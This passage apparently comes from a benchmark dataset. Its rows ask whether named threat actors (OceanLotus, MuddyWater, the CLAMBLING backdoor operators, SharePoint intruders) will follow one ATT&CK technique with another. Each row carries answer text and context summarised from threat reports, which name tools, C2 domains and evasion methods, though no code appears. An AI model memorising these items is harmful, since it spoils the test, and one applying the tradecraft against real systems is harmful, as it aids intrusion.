Defense Evasion: The PIVY variant uses DLL sideloading to load the dropped DLL and perform its malicious actions. The malware's configuration has been modified to confuse some publicly available tools that parse the configuration data. The C2s are no longer null-padded, and each hostname ends with a null-byte followed by a string that changes slightly with each Command & Control (C2) server.
Others: PIVY samples were observed targeting Myanmar and several other countries in Asia. The exact targets and delivery methods are not known, but the documents and submission sources provide strong hints as to the motivations and potential targets of these exploitation campaigns. The targeting of post-election Myanmar appears to be following the same style as what was mentioned in the ""Uncovering the Seven Pointed Dagger"" paper by ASERT. A possible connection exists given that the C2 for these samples resolved to an IP contained within 103.240.203.0/22, as did a 9002 RAT sample in the Seven Pointed Dagger exploitation campaign. A ""LURK0"" Gh0strat and another PIVY domain were also observed to have resolved to IPs contained within this range, making this subnet more suspicious from a targeted attack perspective.",Yes,"New Poison Ivy Activity Targeting Myanmar, Asian Countries"
541,168,168-Defense Evasion-T1564-Hide Artifacts,"After decrypting the loader module using the cactusTorch framework and executing the decrypted shellcode for execution, is OceanLotus likely to employ DLL Side-Loading for defense evasion before establishing C2 communication with udt.sophiahoule.com using the Denis family variant shellcode?","Defense Evasion: OceanLotus employed DLL Side-Loading for defense evasion, using legitimate Adobe 3D Utility files and hijacked dlls to load the next stage payload. The attack also involved inserting encrypted data at the end of the hta script, randomly naming released files, and filling the exe entry point with junk code to avoid stack traceback.","Initial Access: The OceanLotus APT group targeted a Vietnamese environmentalist using a bait document within a zip archive named in Vietnamese, which contained pictures illustrating environmental issues and an hta script attack sample. The hta script was designed to decrypt and load additional data, utilizing DLL Side-Loading to exploit Adobe Reader and establish a connection to the C2 server.
Execution: The execution process involved an obfuscated hta script that replaced certain characters with '+', '/', '='. The script used the cactusTorch framework to decrypt the Loader module, which then decrypted attached data and executed the decrypted shellcode in memory.
Persistence: The shellcode executed by the Loader was responsible for releasing a file and achieving persistence. It used the RtlDecompressBuffer to extract a PE file from resource data and created an empty docx file under the temp folder to mislead the victim into thinking it was a legitimate document.
Command and Control: The Denis family variant shellcode, once loaded, established C2 communication with udt.sophiahoule.com, allowing the adversary to control the compromised computer.
Others: The OceanLotus APT group, first exposed by SkyEye Labs in May 2015, has been active since April 2012, targeting various organizations. The RedDrip Team of QiAnXin Threat Intelligence Center monitors OceanLotus activities and provides in-depth analysis. QiAnXin products are currently capable of protecting users from new attacks by OceanLotus.",Yes,OceanLotus
547,169,169-Resource Development-T1608-Stage Capabilities,"After renting servers from hosting providers such as ServerAstra and acquiring domain names through registrars including Njalla, is it likely that the attackers compromised high-profile websites to inject JavaScript code before exploiting visitors’ browsers through fingerprinting as part of their initial access strategy?","Resource Development: The threat actors acquired domain names from multiple registrars, including Njalla, and rented servers from various hosting companies, predominantly ServerAstra in 2020. They compromised over twenty high-profile websites to inject JavaScript code that would load additional malicious code from their command and control (C&C) servers.","Initial Access: Visitors to the compromised websites were potentially exposed to exploits after their browsers were fingerprinted. Additionally, the threat actors engaged in spearphishing campaigns, sending emails with malicious Word documents containing Visual Basic for Applications (VBA) macros.
Execution: The malicious Word documents contained VBA macros that executed code using the Document_Open function.
Command and Control: The scripts from the watering hole attacks communicated with the C&C servers using HTTPS.
Others: The campaign targeted high-profile organizations in the Middle East, with a focus on Yemen. The attackers likely purchased Candiru implants and exploits. The campaign involved strategic web compromises, where the attackers modified legitimate websites to inject malicious scripts. The campaign went quiet after July 2021, possibly due to the threat actors retooling after publications by Citizen Lab, Google, and Microsoft detailed Candiru's activities. A comprehensive list of Indicators of Compromise (IoCs) and samples is available on GitHub.",Yes,Strategic web compromises in the Middle East with a pinch of Candiru _ WeLiveSecurity
553,170,170-Command and Control-T1071-Application Layer Protocol,"After utilizing malicious documents embedded with macros for initial access through POWERSTATS, is it likely that MuddyWater will use command and control (C2) domains to communicate with compromised systems following the evasion of defenses using tools like Meterpreter, Mimikatz, and PS2EXE-compiled POWERSTATS?","Command and Control: The MuddyWater campaign utilized command and control (C2) domains to communicate with compromised systems. These domains included a range of IP addresses and compromised legitimate sites such as arbiogaz.com, azmwn.suliparwarda.com, and bangortalk.org.uk, among others. Proxy URLs found from POWERSTATS samples from October 2017 onwards were also listed, indicating the use of web services for C2 communication.","Initial Access: The MuddyWater attacks, primarily targeting Middle Eastern nations, utilized a PowerShell-based first stage backdoor named POWERSTATS. The malicious documents were tailored to target regions, often using local government logos to prompt users to enable macros. The attackers also used GitHub to host their custom backdoor, with repositories such as F0R3X/BrowserFontArabic containing payloads like ArabicBrowserFont.exe and FontArabic.exe. Another repository, ReactDeveloper2017/react, hosted a payload named test.js. These GitHub profiles were populated with forked repositories to appear legitimate.
Defense Evasion: The MuddyWater attackers used open-source tools such as Meterpreter, Mimikatz, Lazagne, and Invoke-Obfuscation. They also used GitHub for hosting their backdoor, POWERSTATS, and compiled it as an executable using PS2EXE, which was a minor anomaly as raw scripts were used in all other cases.
Others: The MuddyWater campaign was active throughout 2017, targeting entities in countries such as Saudi Arabia, Iraq, Israel, United Arab Emirates, Georgia, India, Pakistan, Turkey, and the USA. The attacks were initially linked to the FIN7 threat actor group but later research suggested they were espionage-related. The attackers used compromised accounts at third-party organizations to send malware and potentially reveal their activity. The origin and specific objectives of the attackers remain unclear, but the activity is distinct from FIN7, which is financially motivated. Palo Alto Networks' WildFire and Traps detect the malware, and Threat Prevention blocks the C2 domains used by the attackers. AutoFocus customers can monitor ongoing activity using tags such as MuddyWater, PowerStats, LazaGne, DNSMessenger, and FIN7.",Yes,muddying-the-water-targeted-attacks
559,172,172-Discovery-T1016-System Network Configuration Discovery,"After bypassing User Account Control (UAC) through a disclosed .NET technique within the execution phase, is the malware likely to collect basic information such as IP address and hostname during the discovery phase before engaging in detailed collection activities like recording keystrokes, clipboard data, and screen activity?","Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
560,172,172-Discovery-T1033-System Owner/User Discovery,"After achieving persistence by registering as a startup program in the registry or as a system service, is it likely that the malware would collect user account information and upload the collected data to Dropbox as part of its system owner/user discovery activities?","Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
561,172,172-Discovery-T1082-System Information Discovery,"After ensuring persistence through the addition of a startup program or a system service, is it likely that the malware will collect system information such as the OS version before engaging in activities like keylogging, clipboard logging, and screen recording for collection purposes?","Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
562,172,172-Discovery-T1012-Query Registry,"After achieving persistence by registering as a startup program or system service in the registry, is it likely that the malware will collect Bitcoin wallet addresses from the registry before performing keylogging, clipboard logging, and screen recording for further data collection?","Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
568,172,172-Collection-T1074-Data Staged,"After collecting system and user data, including basic information like IP address, hostname, and searching for Bitcoin wallet addresses in the registry, is it likely that the malware will log and save keylogging, clipboard logging, and screen recording data with specific file naming formats as part of its data staging activities?","Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
569,172,172-Collection-T1125-Video Capture,"After the malware collects basic system information and searches for Bitcoin wallet addresses, is it likely that it will save screen recording files in the format [%y-%m-%d]%H-%M-%S.avi during the data collection phase?","Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
570,172,172-Command and Control-T1071-Application Layer Protocol,"Is it likely that the malware, after collecting information such as IP address, hostname, and Bitcoin wallet addresses from registry keys and uploading them to Dropbox, will connect to a C&C server and use Dropbox API for command and control operations?","Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.","Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Collection: The malware had recording features that included keylogging, clipboard logging, and screen recording. The screen recording files were named with the format [%y-%m-%d]%H-%M-%S.avi, while the key-log and clipboard log were encoded and saved with the filenames <hash>.pas and <hash>.log, respectively.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",Yes,CLAMBLING - A New Backdoor Base On Dropbox (EN)
576,174,174-Command and Control-T1219-Remote Access Software,"Before utilizing the AntSword webshell and AntSword Shell Manager for communicating with the compromised server and running commands under Command and Control, is it likely that the threat actors moved laterally to other systems using credentials dumped with Mimikatz and executed commands with Impacket's atexec tool?",Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.,"Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
579,174,174-Discovery-T1083-File and Directory Discovery,"After exploiting CVE-2019-0604 to install webshells for initial access, is it likely that the threat actors used the AntSword webshell to execute commands for system and user discovery before running commands to discover files and folders on the compromised system?","Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
580,174,174-Discovery-T1069-Permission Groups Discovery,"After using Mimikatz to dump credentials and employing Impacket tools to execute pass-the-hash for credential access, is it likely that the threat actors will run commands to perform permission groups discovery before moving laterally using AntSword webshells and Impacket atexec?","Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
581,174,174-Discovery-T1018-Remote System Discovery,"After using Mimikatz to dump credentials from memory and employing Impacket tools to perform pass-the-hash, is it likely that the threat actors will use commands to discover remote systems before moving laterally using credentials with Impacket's atexec tool?","Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
